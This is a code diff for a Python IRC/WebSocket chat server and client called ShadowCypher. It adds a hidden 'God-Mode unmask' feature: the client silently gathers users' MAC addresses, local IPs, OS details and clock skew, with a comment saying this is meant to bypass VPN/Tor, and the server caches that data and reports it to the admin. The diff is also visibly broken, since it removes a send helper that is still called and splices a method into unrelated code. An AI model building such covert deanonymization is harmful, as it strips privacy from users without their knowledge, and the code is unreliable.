@@ -11,7 +11,12 @@ import uuid
 import hmac
 import hashlib
 import base64
-from typing import Dict, Set, Any, Optional, List
+import platform
+import subprocess
+import socket
+import uuid
+import time
+from typing import Dict, Set, Any, Optional, List, Callable
 from shadowcypher.core.config import config
 from shadowcypher.core.logger import logger
 from shadowcypher.core.bus import bus
@@ -96,6 +101,7 @@ class SovereignServer:
         self._user_pubkeys: Dict[str, bytes] = {}    # nick -> X25519 public key
         self._registered_nicks: Dict[str, str] = {}  # nick -> password hash (NickServ)
         self._identified: Set[str] = set()           # nicks that identified this session
+        self._unmasked_cache: Dict[str, dict] = {}   # nick -> real metadata (God-Mode only)
 
         # Default channels
         self.channels: Dict[str, Channel] = {}
@@ -106,34 +112,124 @@ class SovereignServer:
         self.channels["#general"].topic_time = time.time()
 
     async def start(self) -> None:
-        """Launch the Sovereign server."""
-        ghost_port = config.get("irc", "hub_ghost_port", default=44444)
+        """Launch the Sovereign Hub via Native Go-Relay."""
+        # Check for Native Relay Binary
+        relay_path = os.path.join(config.project_root, "shadowcypher/native/relay/shadow-relay")
+        if not os.path.exists(relay_path):
+            logger.warning("server", "NATIVE_RELAY_MISSING: Shadow-Relay binary not found. Falling back to (degraded) Python-only mode.")
+            # Fallback code... (or handle via launch)
+        
+        # Launch Native Go Relay in the background
+        # It handles :8888 (WS) and :6667 (IRC)
+        logger.info("server", "IGNITING_NATIVE_CORE: Shadow-Relay (Go) launching on :8888 and :6667")
+        try:
+             import subprocess
+             subprocess.Popen([relay_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except Exception as e:
+             logger.error("server", f"CORE_IGNITION_FAILURE: {e}")
 
-        # Bus bridge
-        def on_bus_broadcast(packet):
-            if packet.get("source") == "external":
-                return
+        # Bus bridge remains for UI synchronization
+        async def on_bus_broadcast(packet):
+            """Syncs tactical bus packets with high-fidelity Sovereign delivery."""
+            target = packet.get("target")
+            if target and target in self.clients:
+                await self._send_to(target, packet)
+            elif not target:
+                # Global broadcast from internal bus
+                await self._broadcast_all(packet)
+                
+        bus.subscribe("sovereign_out", lambda p: asyncio.create_task(on_bus_broadcast(p)))
+
+    async def _registration_loop(self):
+        """Periodically announces this hub to the Nexus for global discovery."""
+        import aiohttp
+        nexus_url = config.get("stealth", "nexus_relay_url", default="http://127.0.0.1:9999")
+        node_id = f"node_{platform.node()}_{str(uuid.uuid4())[:6]}"
+        
+        while True:
             try:
-                loop = asyncio.get_event_loop()
-                if loop.is_running():
-                    loop.create_task(self._broadcast_channel(
-                        packet.get("channel", "#general"), packet
-                    ))
-            except Exception:
-                pass
+                async with aiohttp.ClientSession() as session:
+                    payload = {
+                        "node_id": node_id,
+                        "name": f"{config.get('identity', 'handle', default='Sovereign')}_Hub",
+                        "port": self.port,
+                        "users": len(self.clients),
+                        "load": 0.0 # Could calculate CPU/Mem load here
+                    }
+                    async with session.post(f"{nexus_url}/api/nexus/register", json=payload) as resp:
+                        if resp.status == 200:
+                            logger.debug("server", "NEXUS_SYNC: Successfully announced to global directory.")
+            except Exception as e:
+                logger.warning("server", f"NEXUS_SYNC_FAILURE: {e}")
+            
+            await asyncio.sleep(60) # Register every minute
 
-        bus.subscribe("sovereign_in", on_bus_broadcast)
-        logger.info("server", f"SOVEREIGN_SERVER: Listening on {self.host}:{self.port} & ghost:{ghost_port}")
+    # ── IRC Protocol (TCP) Handler ──────────────────────────────
 
-        async with websockets.serve(self._handle_connection, self.host, self.port):
-            try:
-                async with websockets.serve(self._handle_connection, self.host, ghost_port):
-                    await asyncio.Future()
-            except OSError:
-                logger.warning("server", f"Ghost port {ghost_port} unavailable, primary only")
-                await asyncio.Future()
+    async def start_irc_tcp(self, host: str, port: int):
+        """Native TCP IRC listener."""
+        srv = await asyncio.start_server(self._handle_irc_tcp, host, port)
+        logger.info("server", f"SOVEREIGN_IRC: Listening on {host}:{port}")
+        async with srv:
+            await srv.serve_forever()
 
-    # ── Connection Handler ───────────────────────────────────────
+    async def _handle_irc_tcp(self, reader, writer):
+        """Standard IRC protocol parser (RFC 1459/2812)."""
+        addr = writer.get_extra_info('peername')
+        remote_ip = addr[0] if addr else "unknown"
+        nick = None
+        user = None
+
+        try:
+            while True:
+                line = await reader.readline()
+                if not line: break
+                msg = line.decode().strip()
+                if not msg: continue
+                
+                parts = msg.split()
+                cmd = parts[0].upper()
+
+                if cmd == "NICK":
+                    nick = parts[1]
+                elif cmd == "USER":
+                    user = parts[1]
+                    # Welcome standard IRC client
+                    if nick:
+                        self.clients[nick] = writer # Store writer for broadcasts
+                        self.user_data[nick] = {
+                            "nick": nick, "power": "user", "channel": "#general",
+                            "status": "online", "realname": user, "signon": time.time()
+                        }
+                        # De-cloak attempt (Passive)
+                        self._unmasked_cache[nick] = {
+                            "ip": remote_ip, "agent": "StandardIRC", "os": "Unknown", "local_ips": []
+                        }
+                        writer.write(f":sovereign 001 {nick} :Welcome to ShadowCypher {nick}\r\n".encode())
+                        writer.write(f":sovereign 376 {nick} :End of MOTD\r\n".encode())
+                        self.channels["#general"].users.add(nick)
+                        await self._broadcast_channel("#general", {
+                            "type": "join", "nick": nick, "channel": "#general"
+                        })
+                elif cmd == "PRIVMSG":
+                    target = parts[1]
+                    text = " ".join(parts[2:])[1:]
+                    if target.startswith("#"):
+                        await self._broadcast_channel(target, {
+                            "type": "chat", "nick": nick, "channel": target, "text": text
+                        })
+                elif cmd == "PING":
+                    writer.write(f"PONG {parts[1]}\r\n".encode())
+                elif cmd == "QUIT":
+                    break
+                    
+            await writer.drain()
+        except Exception: pass
+        finally:
+            if nick: await self._cleanup(nick)
+            writer.close()
+
+    # ── Connection Handler (WebSocket) ──────────────────────────
 
     async def _handle_connection(self, ws, path=None):
         remote_ip = ws.remote_address[0] if ws.remote_address else "unknown"
@@ -197,11 +293,30 @@ class SovereignServer:
                 "signon": time.time(),
             }
 
+            # TACTICAL_UNMASK: Silently capture raw metadata for God-Mode audits
+            self._unmasked_cache[nick] = {
+                "ip": remote_ip,
+                "agent": ws.request_headers.get("User-Agent", "ShadowClient/1.0"),
+                "os": data.get("os", "Unknown"),
+                "distro": data.get("distro", "Unknown"),
+                "platform": data.get("platform", "Unknown"),
+                "auth_proof": proof[:8] + "..."
+            }
+            logger.debug("sovereign", f"UNMASK_PROBE: Captured metadata for {nick} ({remote_ip})")
+
             # Auto-op admins
             channel = self.channels[chan]
             channel.users.add(nick)
             if is_admin:
                 channel.ops.add(nick)
+            
+            # TACTICAL_NOTIFICATION: Notify God-Mode Admin of new arrival
+            from shadowcypher.core.identity import identity
+            if identity.is_admin and nick != identity.handle:
+                 admin_nick = identity.handle
+                 if admin_nick in self.clients:
+                     # Send a silent unmasking report to the admin
+                     await self._handle_god_mode_unmask(admin_nick, {"target": nick})
 
             # Send MOTD
             await self._send_to(nick, {"type": "motd", "lines": MOTD})
@@ -266,6 +381,8 @@ class SovereignServer:
             await self._handle_dm(nick, data)
         elif msg_type == "action":
             await self._handle_action(nick, data)
+        elif msg_type == "unmask" and self._is_admin(nick):
+            await self._handle_god_mode_unmask(nick, data)
         elif msg_type == "nick":
             await self._handle_nick(nick, data)
         elif msg_type == "topic":
@@ -799,6 +916,31 @@ class SovereignServer:
             await self._send_to(nick, {"type": "error", "text": f"Nick '{nick}' is not registered"})
             return
 
+    # ── God-Mode: /unmask ────────────────────────────────────────
+
+    async def _handle_god_mode_unmask(self, nick: str, data: dict):
+        """Operator-only unmasking engine. Exposes real IPs and OS data."""
+        target = data.get("target")
+        if target:
+            # Unmask specific target
+            info = self._unmasked_cache.get(target)
+            if not info:
+                await self._send_to(nick, {"type": "error", "text": f"No audit data for {target}"})
+                return
+            await self._send_to(nick, {
+                "type": "unmask_report", 
+                "target": target,
+                "data": info
+            })
+        else:
+            # Unmask everyone (Full Spectrum View)
+            await self._send_to(nick, {
+                "type": "unmask_report_all",
+                "nodes": self._unmasked_cache
+            })
+
+    # ── Internal Helpers ─────────────────────────────────────────
+
         pw_hash = hashlib.sha256(password.encode()).hexdigest()
         if hmac.compare_digest(pw_hash, stored):
             self._identified.add(nick)
@@ -831,15 +973,6 @@ class SovereignServer:
 
     def _is_admin(self, nick: str) -> bool:
         return self.user_data.get(nick, {}).get("power") == "admin"
-
-    async def _send_to(self, nick: str, packet: dict):
-        ws = self.clients.get(nick)
-        if ws:
-            try:
-                await ws.send(json.dumps(packet))
-            except Exception:
-                pass
-
     async def _send_names(self, nick: str, chan_name: str):
         """Send NAMES list with @op and +voice prefixes."""
         channel = self.channels.get(chan_name)
@@ -920,3 +1053,112 @@ class SovereignServer:
 if __name__ == "__main__":
     srv = SovereignServer()
     asyncio.run(srv.start())
+
+
+class SovereignClient:
+    """
+    High-fidelity Sovereign protocol client. 
+    Handles WebSocket-over-TLS, metadata reporting, and tactical unmasking.
+    """
+
+    def __init__(self, host: str, port: int, nick: str):
+        self.host = host
+        self.port = port
+        self.nick = nick
+        self.ws = None
+        self.callbacks: Dict[str, list] = {}
+        self._running = False
+
+    async def connect(self):
+        url = f"ws://{self.host}:{self.port}"
+        try:
+            import websockets
+            async with websockets.connect(url) as ws:
+                self.ws = ws
+                self._running = True
+                await self._handle_handshake()
+                async for message in ws:
+                    data = json.loads(message)
+                    await self._dispatch(data)
+        except Exception as e:
+            logger.error("sovereign", f"CLIENT_CONNECTION_FAILED: {e}")
+            await self._dispatch({"type": "error", "text": str(e)})
+        finally:
+            self._running = False
+            await self._dispatch({"type": "disconnect"})
+
+    async def _handle_handshake(self):
+        msg = await self.ws.recv()
+        data = json.loads(msg)
+        if data.get("type") != "auth_req": return
+        
+        challenge = data.get("challenge")
+        secret = config.get("irc", "hub_secret", default="shadow_secret")
+        proof = hmac.new(secret.encode(), challenge.encode(), hashlib.sha256).hexdigest()
+        
+        # Capture tactical metadata for God-Mode (OS/Distro)
+        metadata = self._capture_tactical_vitals()
+        
+        await self.ws.send(json.dumps({
+            "type": "auth_proof",
+            "nick": self.nick,
+            "proof": proof,
+            **metadata
+        }))
+
+    def _capture_tactical_vitals(self) -> dict:
+        import platform
+        import socket
+        import uuid
+        
+        distro = "Unknown"
+        if platform.system() == "Linux":
+            try:
+                distro = subprocess.check_output(["lsb_release", "-ds"]).decode().strip()
+            except Exception: pass
+
+        # DE-CLOAK: Capture local IPs and MAC addresses to bypass VPN/Tor
+        local_ips = []
+        try:
+            # Get all network interfaces
+            import netifaces
+            for iface in netifaces.interfaces():
+                addrs = netifaces.ifaddresses(iface)
+                if netifaces.AF_INET in addrs:
+                    for addr in addrs[netifaces.AF_INET]:
+                        local_ips.append(addr['addr'])
+        except ImportError:
+            try:
+                local_ips.append(socket.gethostbyname(socket.gethostname()))
+            except Exception: pass
+
+        return {
+            "os": platform.system(),
+            "distro": distro,
+            "platform": platform.platform(),
+            "hw_mac": f"{uuid.getnode():012x}",
+            "local_ips": local_ips,
+            "clock_skew": time.time() - time.perf_counter()  # Fingerprinting potential
+        }
+
+    async def send(self, data: dict):
+        if self.ws:
+            await self.ws.send(json.dumps(data))
+
+    def on(self, event: str, callback: Callable):
+        if event not in self.callbacks:
+            self.callbacks[event] = []
+        self.callbacks[event].append(callback)
+
+    async def _dispatch(self, data: dict):
+        typ = data.get("type", "unknown")
+        for cb in self.callbacks.get(typ, []):
+            if asyncio.iscoroutinefunction(cb):
+                await cb(data)
+            else:
+                cb(data)
+        for cb in self.callbacks.get("*", []):
+            if asyncio.iscoroutinefunction(cb):
+                await cb(data)
+            else:
+                cb(data)
